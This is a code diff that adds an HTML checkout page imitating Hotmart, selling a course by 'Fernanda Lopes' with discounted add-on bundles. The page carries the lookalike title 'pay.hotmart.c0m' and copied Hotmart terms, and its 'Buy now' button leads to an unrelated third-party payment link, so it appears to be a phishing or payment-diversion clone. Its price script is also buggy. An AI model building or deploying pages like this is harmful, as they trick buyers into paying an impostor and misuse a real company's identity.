@@ -1,0 +1,259 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>pay.hotmart.c0m</title>
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      padding: 20px;
+      background: #f5f5f5;
+      max-width: 700px;
+      margin: auto;
+      font-weight: 1px;
+      border: solid rgba(48, 41, 41, 0.249);
+      border-width: 1px;
+      border-radius: 5px;
+      margin-top: 35px;
+      margin-bottom: 35px;
+    }
+    .a{
+      text-decoration: none;
+      color: white;
+    }
+    h2 {
+      color: #222;
+      margin-top: 30px;
+    }
+    .box {
+      padding: 30px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      line-height: 7px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      margin-top: 15px;
+    }
+    input[type="text"], input[type="email"], input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 4px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .addon {
+      margin-top: 10px;
+      line-height: 28px;
+      font-size: large;
+      color: #222;
+      margin-left: 110px;
+    
+    }
+    .addon input {
+      margin-right: 10px;
+    }
+
+
+    .price {
+      font-weight: bold;
+      color: #004aad;
+      font-size: 18px;
+    }
+    .total {
+      font-size: 24px;
+      color: rgb(4, 91, 149);
+      margin-top: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      background: green;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .img img{
+      float: left;
+      margin-right: 20px;
+    }
+    #imgp{
+      width: 90px;
+      border-radius: 5px;
+    }
+    .tt, label{
+      font-family: sans-serif;
+      font-size: smaller;
+    }
+    #formf{
+      line-height: 22px;
+    }
+    .str{
+      font-size: large;
+      color: #191a19;
+    }
+    .discount{
+      background-color: rgb(8, 149, 8);
+      color: white;
+      padding: 3px;
+      border-radius: 5px;
+    }
+    .checkbtn{
+      background-color: rgba(22, 231, 22, 0.294);
+      border: rgba(22, 231, 22, 0.294);
+      border-width: 3px;
+      padding: 15px;
+      margin: 0px;
+    }
+    .checkbtn:hover{
+      border: solid black;
+      border-width: 3px;
+      border-radius: 6px;
+      margin: 0px;
+    }
+    .whole{
+      border: solid green;
+      border-width: 2px;
+      border-radius: 5px;
+      padding-top: 15px;
+    }
+    .questions{
+      line-height: 25px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <div class="img"><img src="first.png" alt="" id="imgp"></div>
+    <div><strong>Sentada Pompoarista</strong>
+      <p class="tt">Author: Fernanda Lopes</p>
+    <p class="price" data-price="8.77">$8.77</p></div>
+  </div>
+
+<hr>
+  <div class="box" id="formf">
+    <label for="email">Your email eddress</label>
+    <input type="email" id="email" placeholder="Enter the email to recieve your purchase">
+     
+     <label for="email">Confirm your email</label>
+    <input type="email" id="email" placeholder="Enter your email again">
+
+    <label for="fullName">Full Name</label>
+    <input type="text" id="fullName" placeholder="Enter your full name">
+
+    <label for="phone">Phone Number</label>
+    <input type="tel" id="phone" placeholder="+351 21 123 4567">
+  </div>
+
+  <div class="box" id="addon1">
+    <div class="whole">
+    <div class="img"> <img src="second.png" alt="" id="imgp"></div>
+    <div class="addon">
+      <label for="addon1">Combo 2 em 1: Cursos  Boca de motor e Como  dar um chá <br> <s>$41.38</s> &nbsp; <small class="discount">↓ 50%</small><br><strong class="str">$20.69</strong></label>
+      </div>
+    <div class="checkbtn"> <input type="checkbox" class="addon-checkbox" data-price="20.69" id="addon1"> Add to purchase</div>
+    </div>
+<br> <br><br>
+        <div class="whole">
+    <div class="img"> <img src="third.png" alt="" id="imgp"></div>
+    <div class="addon">
+      <label for="addon1">Combo 2 em 1: Cursos  Como dar chá de bct e Como Ser Uma Mulher F@da <br> <s>$115.65</s> &nbsp; <small class="discount">↓ 50%</small><br><strong class="str">$57.825</strong></label>
+      </div>
+    <div class="checkbtn"> <input type="checkbox" class="addon-checkbox" data-price="57.825" id="addon2"> Add to purchase</div>
+    </div>
+<br> <br><br>
+        <div class="whole">
+    <div class="img"> <img src="fourth.png" alt="" id="imgp"></div>
+    <div class="addon">
+      <label for="addon1">Combo 3 em 1: Livros: <br> boca de motor, zonas  secretas e como Ser Uma mulher F@da <br> <s>$23.424</s> &nbsp; <small class="discount">↓ 50%</small><br><strong class="str">$11.712</strong></label>
+      </div>
+    <div class="checkbtn"> <input type="checkbox" class="addon-checkbox" data-price="11.712" id="addon3"> Add to purchase</div>
+    </div>
+
+  </div>
+
+
+
+  <!-- <h2>Payment Details</h2>
+  <div class="box">
+    <label for="cardNumber">Card Number</label>
+    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000">
+
+    <label for="expiry">Expiration Date</label>
+    <input type="text" id="expiry" placeholder="MM/YY">
+
+    <label for="cvv">Security Code</label>
+    <input type="text" id="cvv" placeholder="3- or 4-digit code">
+  </div> -->
+
+  <div class="total">
+    Total: $<span id="totalPrice">8</span>.77
+  </div>
+
+ <a href="https://hushpay.app/pay/6850434faf3b6" class="a"> <button onclick="buyNow()">Buy now</button></a>
+
+  <div class="questions">
+    <p>
+      <a href="">Have questions about the product? Please contact</a>
+
+<p><a href="">Can't complete this purchase? Please visit our Help Center</a> <br>
+
+If you need to submit a request to our support team, please provide the code below:
+
+<strong>CKTID-X98153299Wpz9qzsvz1-1750076569610-5270</strong></p>
+
+<p>By clicking 'Buy Now' I declare that I (i) understand that Hotmart is processing this order on behalf of Fernanda Lopes and has no responsibility for the content and/or control over it; (ii) agree to Hotmart's <a href="">Terms of Use,</a> <a href="">Privacy Policy</a> and <a href="">other company policies</a> and (iii) am of legal age or authorized and accompanied by a legal guardian.</p>
+
+<p>Learn more about your purchase <a href="">here.</a></p>
+
+Hotmart © 2025 - All rights reserved <br>
+
+2025-06-16T12:22:50.916Z <a href="">REF.</a>
+
+    </p>
+  </div>
+
+  <script>
+    const basePrice = 8.;
+    const checkboxes = document.querySelectorAll('.addon-checkbox');
+    const totalDisplay = document.getElementById('totalPrice');
+
+    function calculateTotal() {
+      let total = basePrice;
+      checkboxes.forEach(cb => {
+        if (cb.checked) {
+          total += parseInt(cb.getAttribute('data-price'));
+        }
+      });
+      totalDisplay.textContent = total.toLocaleString();
+    }
+
+    checkboxes.forEach(cb => {
+      cb.addEventListener('change', calculateTotal);
+    });
+
+    // function buyNow() {
+    //   const email = document.getElementById('email').value;
+    //   const fullName = document.getElementById('fullName').value;
+    //   const phone = document.getElementById('phone').value;
+    //   const cardNumber = document.getElementById('cardNumber').value;
+    //   const expiry = document.getElementById('expiry').value;
+    //   const cvv = document.getElementById('cvv').value;
+
+    //   if (!email || !fullName || !phone || !cardNumber || !expiry || !cvv) {
+    //     alert("Please complete all required fields.");
+    //     return;
+    //   }
+
+    //   alert(`✅ Purchase Complete!\n\nName: ${fullName}\nTotal: $${totalDisplay.textContent}`);
+    // }
+  </script>
+</body>
+</html>
